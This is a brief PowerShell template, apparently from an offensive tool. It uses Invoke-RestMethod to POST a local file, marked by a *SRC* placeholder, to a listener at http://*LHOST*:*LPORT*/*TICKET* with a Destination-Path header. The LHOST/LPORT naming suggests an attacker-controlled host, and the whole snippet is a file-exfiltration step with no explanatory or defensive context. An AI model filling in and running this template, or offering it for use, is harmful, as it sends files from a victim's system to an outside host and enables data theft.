try {
    $headers = @{"Destination-Path" = "*DEST*"}
    IRM -Uri "http://*LHOST*:*LPORT*/*TICKET*" -Method Post -InFile "*SRC*" -ContentType "application/octet-stream" -Headers $headers
} catch {echo $_}
